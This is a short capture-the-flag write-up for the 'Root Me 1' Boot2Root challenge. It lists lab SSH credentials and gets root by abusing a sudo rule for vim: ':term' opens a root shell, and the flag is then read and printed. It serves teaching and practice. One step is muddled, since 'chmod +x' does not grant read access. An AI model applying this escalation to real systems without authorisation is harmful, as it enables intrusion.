# 5 - Root Me 1

CTF name: Imperial CTF 22 Qualifiers
Challenge name: Root Me 1
Challenge category: Boot2Root
Challenge points: 50 (Easy)

We ssh to the server using:
`ssh user@192.168.125.100 -p 9005`

and login with the given username `user` and password `h4ck3r`

We find in the home directory the file `flag.txt` but it does not have read permissions.

Thus the goal is to escalate privileges.

We check if there are any sudo commands that user is allowed to execute using the command
`sudo -l`

```
Matching Defaults entries for user on 730d3d393080:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on 730d3d393080:
    (root) /usr/bin/vim
```
    
We find that the user can run `sudo vim`

So we run `sudo vim` and use `:term` to get a terminal window in vim which is controlled by root

Now we have sudo privileges we can use `chmod +x flag.txt`

and read the `flag.txt` file by using `cat flag.txt`

which gives us the flag

`ICTF{v1m_1s_b3tt3r_th4n_3m4c5_4nd_n4n0_h4h4h4}`
